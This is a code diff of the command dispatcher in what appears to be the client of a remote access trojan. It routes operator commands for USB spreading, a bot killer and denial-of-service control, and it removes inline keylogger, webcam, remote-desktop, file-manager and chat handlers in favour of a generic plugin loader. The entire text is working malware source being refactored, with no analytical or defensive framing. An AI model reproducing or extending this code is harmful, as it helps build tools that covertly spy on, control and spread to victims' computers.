@@ -17,7 +17,6 @@ namespace Client.Handle_Packet
     {
         public static CancellationTokenSource ctsDos;
         public static CancellationTokenSource ctsReportWindow;
-        public static FormChat GetFormChat;
         public static string FileCopy = null;
 
         public static void Read(object data)
@@ -100,15 +99,9 @@ namespace Client.Handle_Packet
                             break;
                         }
 
-                    case "usbSpread":
+                    case "usb":
                         {
                             new HandleLimeUSB(unpack_msgpack);
-                            break;
-                        }
-
-                    case "remoteDesktop":
-                        {
-                            new HandleRemoteDesktop(unpack_msgpack);
                             break;
                         }
 
@@ -118,33 +111,9 @@ namespace Client.Handle_Packet
                         }
                         break;
 
-                    case "fileManager":
-                        {
-                            new FileManager(unpack_msgpack);
-                        }
-                        break;
-
                     case "botKiller":
                         {
                             new HandleBotKiller().RunBotKiller();
-                            break;
-                        }
-
-                    case "keyLogger":
-                        {
-                            string isON = unpack_msgpack.ForcePathObject("isON").AsString;
-                            if (isON == "true")
-                            {
-                                new Thread(() =>
-                                {
-                                    HandleLimeLogger.isON = true;
-                                    HandleLimeLogger.Run();
-                                }).Start();
-                            }
-                            else
-                            {
-                                HandleLimeLogger.isON = false;
-                            }
                             break;
                         }
 
@@ -191,24 +160,6 @@ namespace Client.Handle_Packet
                             break;
                         }
 
-                    case "chat":
-                        {
-                            new HandlerChat().CreateChat();
-                            break;
-                        }
-
-                    case "chatWriteInput":
-                        {
-                            new HandlerChat().WriteInput(unpack_msgpack);
-                            break;
-                        }
-
-                    case "chatExit":
-                        {
-                            new HandlerChat().ExitChat();
-                            break;
-                        }
-
                     case "pcOptions":
                         {
                             new HandlePcOptions(unpack_msgpack.ForcePathObject("Option").AsString);
@@ -240,12 +191,11 @@ namespace Client.Handle_Packet
                             break;
                         }
 
-                    case "webcam":
+                    case "plugin":
                         {
-                            HandleWebcam.Run(unpack_msgpack);
+                            new HandlePlugin(unpack_msgpack);
                             break;
                         }
-
 
                         //case "netStat":
                         //    {
